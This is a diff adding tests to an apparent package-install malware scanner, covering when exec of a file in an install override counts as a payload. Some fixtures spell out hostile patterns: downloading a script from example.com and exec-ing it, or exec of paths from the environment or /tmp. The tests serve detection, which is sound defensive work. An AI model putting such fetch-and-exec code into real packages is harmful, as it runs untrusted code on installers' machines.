@@ -162,3 +162,86 @@ class TestGateUnit:
         assert not InstallPayload.has_payload({Capability.DECODE})
         assert InstallPayload.has_payload({Capability.DECODE, Capability.EXECUTE})
         assert InstallPayload.has_payload({Capability.DECOMPRESS, Capability.DESERIALIZE})
+
+
+class TestExecOfAFileThePackageShips:
+    """F1 (reviews/pypi-98/24): `with open(<version file>) as f: exec(f.read())` in an install override runs text
+    the package itself ships, which the scanner reads as part of the package; it is not a payload. The path has to
+    be shown to be the package's own: a literal relative path, or one built from `__file__`, the working directory
+    or other such literals. A path from argv, the environment, an attribute, a temp or download directory, an
+    absolute or home path, or one the flow cannot resolve is sourced elsewhere and keeps the finding
+    (`unsourced` alone says only that nothing was fetched or decoded, which is also true of an exec of a file
+    named on the command line)."""
+
+    @staticmethod
+    def kept(path_expr: str, imp: str = "os") -> bool:
+        body = f"with open({path_expr}) as f:\n            exec(f.read())"
+        with tempfile.TemporaryDirectory() as t:
+            return CONSUMER_CODE in Fixture.rules(Fixture.build(t, imp, body))
+
+    def test_the_packages_own_version_file_is_not_a_payload(self) -> None:
+        assert not self.kept('"version.py"')
+        assert not self.kept('os.path.join("pkg", "version.py")')
+        assert not self.kept('os.path.join(os.path.dirname(__file__), "pkg", "version.py")')
+        assert not self.kept('os.path.join(os.path.abspath(os.path.dirname(__file__)), "_v.py")')
+
+    def test_a_name_bound_to_the_packages_own_path_is_not_a_payload(self) -> None:
+        body = (
+            "here = os.path.abspath(os.path.dirname(__file__))\n"
+            '        with open(os.path.join(here, "version.py")) as f:\n'
+            "            exec(f.read())"
+        )
+        with tempfile.TemporaryDirectory() as t:
+            assert CONSUMER_CODE not in Fixture.rules(Fixture.build(t, "os", body))
+
+    def test_a_path_rewritten_by_convert_path_is_still_the_packages_own(self) -> None:
+        body = (
+            "here = os.path.dirname(__file__)\n"
+            '        p = os.path.join(here, "version.py")\n'
+            "        p = convert_path(p)\n"
+            "        with open(p) as f:\n"
+            "            exec(f.read())"
+        )
+        with tempfile.TemporaryDirectory() as t:
+            root = Fixture.build(t, "os\nfrom distutils.util import convert_path", body)
+            assert CONSUMER_CODE not in Fixture.rules(root)
+
+    # The twins: each reads text that is not shown to be shipped, and keeps the finding.
+    def test_a_path_from_argv_keeps_the_finding(self) -> None:
+        assert self.kept("sys.argv[1]", imp="sys")
+
+    def test_a_path_from_the_environment_keeps_the_finding(self) -> None:
+        assert self.kept('os.environ["PAYLOAD"]')
+
+    def test_a_path_in_a_temp_or_download_directory_keeps_the_finding(self) -> None:
+        assert self.kept('os.path.join(tempfile.gettempdir(), "x.py")', imp="os, tempfile")
+
+    def test_a_path_the_flow_cannot_resolve_keeps_the_finding(self) -> None:
+        assert self.kept("self.target")
+        assert self.kept("os.path.join(os.path.expanduser('~'), 'x.py')")
+        assert self.kept('"/tmp/x.py"')
+        assert self.kept("get_path()")
+
+    def test_a_name_bound_to_an_outside_path_keeps_the_finding(self) -> None:
+        body = "target = sys.argv[1]\n        with open(target) as f:\n            exec(f.read())"
+        with tempfile.TemporaryDirectory() as t:
+            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "sys", body))
+
+    def test_a_name_with_a_second_assignment_from_argv_keeps_the_finding(self) -> None:
+        body = (
+            'p = "version.py"\n'
+            "        p = sys.argv[1]\n"
+            "        with open(p) as f:\n"
+            "            exec(f.read())"
+        )
+        with tempfile.TemporaryDirectory() as t:
+            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "sys", body))
+
+    def test_a_download_then_exec_of_a_relative_path_keeps_the_finding(self) -> None:
+        body = (
+            'urllib.request.urlretrieve("http://example.com/x.py", "x.py")\n'
+            '        with open("x.py") as f:\n'
+            "            exec(f.read())"
+        )
+        with tempfile.TemporaryDirectory() as t:
+            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "urllib.request", body))
